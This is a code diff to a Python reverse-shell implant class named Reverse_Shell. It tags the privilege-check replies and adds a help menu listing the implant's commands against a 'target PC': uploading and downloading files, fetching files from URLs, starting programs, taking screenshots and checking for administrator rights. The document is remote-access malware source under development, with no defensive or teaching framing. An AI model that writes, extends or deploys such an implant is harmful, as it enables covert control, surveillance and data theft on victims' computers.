@@ -109,9 +109,17 @@ class Reverse_Shell:
             elif command[:5] == "check":
                 self.has_admin()
                 if admin:
-                    self.reliable_send("Administrator privileges")
+                    self.reliable_send("[+]Administrator privileges")
                 else:
-                    self.reliable_send("User privileges")
+                    self.reliable_send("[-]User privileges")
+            elif command[:4] == "help":
+                help_options = '''                          download   -> Download a file from target PC
+                                   upload     -> Upload a file from target PC
+                                   get url    -> Download a file from target website
+                                   start path -> Start program on target pc
+                                   screenshot -> take a screenshort of the target monitor
+                                   check      -> Check for administrator privileges '''
+                self.reliable_send(help_options)
             else:
                 try:
                     # creation of the command, see documentation
